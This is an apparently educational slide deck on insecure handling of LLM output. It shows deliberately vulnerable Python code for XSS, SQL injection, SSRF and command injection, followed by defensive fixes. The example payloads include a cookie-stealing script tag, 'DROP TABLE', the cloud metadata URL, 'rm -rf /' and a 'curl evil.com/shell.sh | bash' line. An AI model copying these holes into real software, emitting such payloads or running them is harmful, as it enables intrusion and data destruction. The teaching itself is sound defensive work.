# LLM02: Insecure Output Handling
## When `LLM` Output Becomes a Weapon

---

## What is Insecure Output Handling?

- `LLM` output is used **without proper validation or sanitization**
- The output is passed to downstream components that interpret it
- Enables traditional web vulnerabilities through a new vector
- The `LLM` becomes an intermediary for attacks

---

## The Core Problem

<svg xmlns="http://www.w3.org/2000/svg" width="680" height="160" font-family="sans-serif">
  <defs>
    <marker id="arr" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555555"/>
    </marker>
  </defs>
  <rect x="10"  y="40" width="110" height="44" fill="#e3f2fd" stroke="#333333" stroke-width="1.5" rx="4"/>
  <text x="65"  y="58" text-anchor="middle" font-size="12" font-weight="bold" fill="#222222">User Input</text>
  <text x="65"  y="76" text-anchor="middle" font-size="11" fill="#555555">prompt</text>
  <line x1="120" y1="62" x2="165" y2="62" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="167" y="40" width="90" height="44" fill="#e8f5e9" stroke="#333333" stroke-width="1.5" rx="4"/>
  <text x="212" y="67" text-anchor="middle" font-size="13" font-weight="bold" fill="#222222">LLM</text>
  <line x1="257" y1="62" x2="302" y2="62" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="304" y="28" width="120" height="68" fill="#fff3e0" stroke="#f9a825" stroke-width="2" rx="4"/>
  <text x="364" y="52" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">Raw Output</text>
  <text x="364" y="70" text-anchor="middle" font-size="11" fill="#555555">unsanitized!</text>
  <text x="364" y="86" text-anchor="middle" font-size="10" fill="#c62828">no filtering</text>
  <line x1="424" y1="62" x2="469" y2="62" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="471" y="22" width="185" height="80" fill="#fce4ec" stroke="#c62828" stroke-width="1.5" rx="4"/>
  <text x="563" y="46" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">Downstream Systems</text>
  <text x="563" y="64" text-anchor="middle" font-size="11" fill="#333333">Browser / Database</text>
  <text x="563" y="82" text-anchor="middle" font-size="11" fill="#333333">Shell / API</text>
  <text x="364" y="125" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">No sanitization here!</text>
  <text x="364" y="145" text-anchor="middle" font-size="11" fill="#555555">Leads to XSS, SQL injection, command injection</text>
</svg>

`LLM` output is **untrusted data** — treat it like user input

---

## Attack Vectors Through `LLM` Output

| Downstream Target | Potential Attack        |
|--------------------|------------------------|
| Web browser        | `XSS` (Cross-Site Scripting) |
| Database query     | `SQL` Injection         |
| Shell command      | Command Injection       |
| `API` calls        | `SSRF`, parameter injection |
| File system        | Path traversal          |
| Email system       | Header injection        |

---

## `XSS` via `LLM` Output

```python
# Vulnerable: LLM output rendered directly in HTML
@app.route("/chat")
def chat():
    user_msg = request.args.get("message")
    response = llm.generate(user_msg)
    # Dangerous! LLM output inserted into HTML
    return f"<div class='response'>{response}</div>"
```

If the `LLM` outputs `<script>steal_cookies()</script>`, the browser executes it

---

## `SQL` Injection via `LLM` Output

```python
# Vulnerable: LLM output used in SQL query
def search_products(user_request):
    # Ask LLM to generate search terms
    search_term = llm.generate(
        f"Extract product name from: {user_request}"
    )
    # Dangerous! LLM output in SQL query
    query = f"SELECT * FROM products WHERE name = '{search_term}'"
    return db.execute(query)
```

An attacker can manipulate the `LLM` to output: `'; DROP TABLE products;--`

---

## Server-Side Request Forgery (`SSRF`)

```python
# Vulnerable: LLM output used as URL
def fetch_reference(user_question):
    url = llm.generate(
        f"Provide a URL reference for: {user_question}"
    )
    # Dangerous! LLM-generated URL fetched by server
    response = requests.get(url)
    return response.text
```

`LLM` could generate: `http://169.254.169.254/latest/meta-data/` (cloud metadata endpoint)

---

## Command Injection via `LLM` Output

```python
# Vulnerable: LLM output used in shell command
def process_file(user_request):
    filename = llm.generate(
        f"Extract the filename from: {user_request}"
    )
    # Dangerous! LLM output in shell command
    os.system(f"cat /uploads/{filename}")
```

`LLM` could output: `file.txt; rm -rf /` or `file.txt; curl evil.com/shell.sh | bash`

---

## Mitigation: Output Encoding

```python
from markupsafe import escape

@app.route("/chat")
def chat():
    user_msg = request.args.get("message")
    response = llm.generate(user_msg)
    # Safe: HTML-encode the output
    safe_response = escape(response)
    return f"<div class='response'>{safe_response}</div>"
```

Always encode `LLM` output for the target context

---

## Mitigation: Parameterized Queries

```python
def search_products(user_request):
    search_term = llm.generate(
        f"Extract product name from: {user_request}"
    )
    # Safe: Use parameterized queries
    query = "SELECT * FROM products WHERE name = %s"
    return db.execute(query, (search_term,))
```

Never concatenate `LLM` output into `SQL` queries

---

## Mitigation: Output Validation

```python
import re

def validate_llm_output(output: str, expected_type: str) -> str:
    if expected_type == "product_name":
        # Only allow alphanumeric and spaces
        if not re.match(r'^[a-zA-Z0-9\s]{1,100}$', output):
            raise ValueError("Invalid product name from LLM")
    elif expected_type == "url":
        # Only allow HTTPS URLs to allowed domains
        allowed = ["docs.example.com", "api.example.com"]
        parsed = urlparse(output)
        if parsed.hostname not in allowed:
            raise ValueError("URL not in allowlist")
    return output
```

---

## Mitigation: Content Security Policy

```python
@app.after_request
def add_security_headers(response):
    # Prevent inline script execution even if XSS occurs
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'"
    )
    return response
```

`CSP` headers provide a safety net against `XSS`

---

## The Golden Rule

> Never pass `LLM` output directly to an interpreter

- **HTML renderer** — encode/sanitize first
- **SQL engine** — use parameterized queries
- **Shell** — avoid entirely; use `APIs` instead
- **File system** — validate and restrict paths
- **`API` calls** — validate against allowlists

---

## Key Takeaways

- `LLM` output is **untrusted data** — always sanitize it
- Apply the **same defenses** you use against user input
- Use **parameterized queries**, **output encoding**, and **allowlists**
- **Content Security Policy** provides an additional safety layer
- The `LLM` can become an unwitting accomplice in traditional attacks
